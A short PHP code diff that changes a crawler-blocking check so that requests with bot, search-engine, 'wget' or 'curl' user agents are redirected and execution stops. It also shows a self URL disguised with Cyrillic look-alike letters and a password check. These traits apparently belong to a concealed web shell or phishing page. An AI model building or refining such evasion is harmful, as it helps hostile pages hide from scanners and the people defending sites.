@@ -18,7 +18,7 @@ $tampered	= array('А', 'd', 'Е', 'І', 'О', 'Ү', 'а', 'е', 'о', 'у', 'O'
 $phpself 	= str_replace($original, $tampered, $_SERVER['PHP_SELF']);
 $blacklist	= array("bot", "yahoo", "wget", "msn", "java", "baidu", "curl", "crawl", "survey", "teoma", "thumbnail", "tineye", "yandex", "yeti");
 foreach ($blacklist as $badua) {
-	if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), $badua)) { header("Location: {$phpself}"); }
+	if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), $badua)) { die(header("Location: {$phpself}")); }
 }
 
 if (isset($_REQUEST['password'])) {
